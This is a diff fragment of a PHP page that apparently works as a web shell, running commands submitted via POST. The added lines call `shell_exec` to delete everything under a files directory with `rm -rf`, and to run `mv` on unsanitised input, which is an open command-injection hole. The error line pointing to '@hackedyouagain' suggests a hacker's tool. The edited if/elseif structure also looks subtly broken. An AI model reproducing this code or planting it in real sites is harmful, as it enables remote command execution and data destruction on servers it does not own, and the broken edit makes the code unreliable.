@@ -64,9 +64,10 @@ if (isset($_POST['cmd'])) {
 <?= htmlspecialchars($cmd, ENT_QUOTES, 'UTF-8') ?>
         </pre>
 <?php endif; ?>
-<?php elseif($radioval == "remove") : ?>
-			<?php $cmd=shell_exec("cd files && rm -rf *"); ?>
-		<?php	if ($cmd) : ?>
+	
+<?php if($radioval == "remove") : ?>
+<?php		$cmd=shell_exec("rm -rf ./files/* "); ?>
+		<?php if ($cmd) : ?>
 		<div class="pb-2 mt-4 mb-2">
             <h2> Output </h2>
         </div>
@@ -75,17 +76,17 @@ if (isset($_POST['cmd'])) {
         </pre>
 <?php endif; ?>
 
-<?php elseif($radioval == "rename") : ?>
-			<?php $cmd=shell_exec("mv ".$rn1." ".$rn2); ?>
-		<?php	if ($cmd) : ?>
+<?php if($radioval == "rename") : ?>
+<?php		$cmd=shell_exec("mv " .$rn1 ." " .$rn2); ?>
+		<?php if ($cmd) : ?>
 		<div class="pb-2 mt-4 mb-2">
             <h2> Output </h2>
         </div>
         <pre>
 <?= htmlspecialchars($cmd, ENT_QUOTES, 'UTF-8') ?>
         </pre>
-<?php endif; ?>
-
+<?php endif; ?>	
+	
 <?php elseif (!$cmd && $_SERVER['REQUEST_METHOD'] == 'POST') : 
 		{
 			echo "Error kindly contact @hackedyouagain";
